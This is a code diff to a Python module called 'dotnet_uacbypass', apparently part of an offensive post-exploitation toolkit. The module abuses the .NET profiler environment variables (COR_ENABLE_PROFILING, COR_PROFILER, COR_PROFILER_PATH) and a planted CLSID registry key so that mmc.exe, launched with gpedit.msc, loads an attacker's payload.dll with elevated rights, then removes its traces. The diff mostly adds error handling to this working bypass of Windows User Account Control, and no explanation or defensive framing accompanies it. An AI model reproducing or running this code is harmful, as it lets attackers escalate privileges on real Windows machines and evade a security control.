@@ -16,7 +16,7 @@ dotnet_info = {
 	"Function Name": "dotnet_uacbypass",
 	"Function Payload": True,
 }
- 
+
 guid_array = []
 
 def GenerateGUID():
@@ -51,6 +51,7 @@ def dotnet_uacbypass(payload):
 					print_success("Created: {path}".format(path=path))
 				else:
 					print_error("Unable to create: {path}".format(path=path))
+					return False
 			else:
 				path = "Software\\Classes\\CLSID\\{{{guid}}}".format(guid=guid_array[0])
 				print_info("Writing CLSID: {path}".format(path=path))
@@ -59,45 +60,37 @@ def dotnet_uacbypass(payload):
 					print_success("Created: {path}".format(path=path))
 				else:
 					print_error("Unable to create: {path}".format(path=path))
+					return False
 		else:
 			print_error("Unable to generate a random GUID")
-
+			return False
 
 		print_info("Creating Environment variables")
 		if registry().modify_key(hkey="hkcu", path="Environment", name="COR_ENABLE_PROFILING", value="1", create=True):
 			print_success("Created: COR_ENABLE_PROFILING")
 		else:
 			print_error("Unable to create: COR_ENABLE_PROFILING")
+			return False
 		
 		if registry().modify_key(hkey="hkcu", path="Environment", name="COR_PROFILER", value="{{{guid}}}".format(guid=guid_array[0]), create=True):
 			print_success("Created: COR_PROFILER")
 		else:
 			print_error("Unable to create: COR_PROFILER")
+			return False
 			
 		if registry().modify_key(hkey="hkcu", path="Environment", name="COR_PROFILER_PATH", value=os.path.join(tempfile.gettempdir(), "payload.dll"), create=True):
 			print_success("Created: COR_PROFILER_PATH")
 		else:
 			print_error("Unable to create: COR_PROFILER_PATH")
-
-
-		print_info("Setting Environment variables")
-		os.environ["COR_ENABLE_PROFILING"] = "1"
-		print_success("Successfully: COR_ENABLE_PROFILING = 1")
-
-		os.environ["COR_PROFILER"] = "{{{guid}}}".format(guid=guid_array[0])
-		print_success("Successfully: COR_PROFILER = {{{guid}}}".format(guid=guid_array[0]))
-
-		os.environ["COR_PROFILER_PATH"] = os.path.join(tempfile.gettempdir(), "payload.dll")
-		print_success("Successfully: COR_PROFILER_PATH = {payload}".format(payload=os.path.join(tempfile.gettempdir(), "payload.dll")))
-
+			return False
 
 		if process().create("mmc.exe", params="gpedit.msc", window=True):
 			print_success("Created mmc.exe process")
 		else:
 			print_error("Unable to create mmc.exe process")
-
+			return False
+			
 		time.sleep(5)
-
 
 		print_info("Performing clean up")
 		if os.path.isfile(os.path.join(tempfile.gettempdir(), "payload.dll")) == True:
@@ -115,6 +108,7 @@ def dotnet_uacbypass(payload):
 				print_success("Deleted CLSID: {path}".format(path=path))
 			else:
 				print_error("Unable to delete CLSID: {path}".format(path=path))
+				return False
 		else:
 			path = "Software\\Classes\\CLSID\\{{{guid}}}".format(guid=guid_array[0])
 
@@ -122,30 +116,25 @@ def dotnet_uacbypass(payload):
 				print_success("Deleted CLSID: {path}".format(path=path))
 			else:
 				print_error("Unable to delete CLSID: {path}".format(path=path))
+				return False
 
 		if registry().remove_key(hkey="hkcu", path="Environment", name="COR_ENABLE_PROFILING", delete_key=False):
 			print_success("Deleted Environment: COR_ENABLE_PROFILING")
 		else:
 			print_error("Unable to delete: COR_ENABLE_PROFILING")
-		
+			return False
+
 		if registry().remove_key(hkey="hkcu", path="Environment", name="COR_PROFILER", delete_key=False):
 			print_success("Deleted Environment: COR_PROFILER")
 		else:
-			print_error(" Unable to delete: COR_PROFILER")
+			print_error("Unable to delete: COR_PROFILER")
+			return False
 
 		if registry().remove_key(hkey="hkcu", path="Environment", name="COR_PROFILER_PATH", delete_key=False):
 			print_success("Deleted Environment: COR_PROFILER_PATH")
 		else:
 			print_error("Unable to delete: COR_PROFILER_PATH")
-
-		del os.environ["COR_ENABLE_PROFILING"]
-		print_success("Deleted: COR_ENABLE_PROFILING")
-
-		del os.environ["COR_PROFILER"]
-		print_success("Deleted: COR_PROFILER")
-
-		del os.environ["COR_PROFILER_PATH"]
-		print_success("Deleted: COR_PROFILER_PATH")
+			return False
 	else:
 		print_error("Cannot proceed, invalid payload")
 		return False
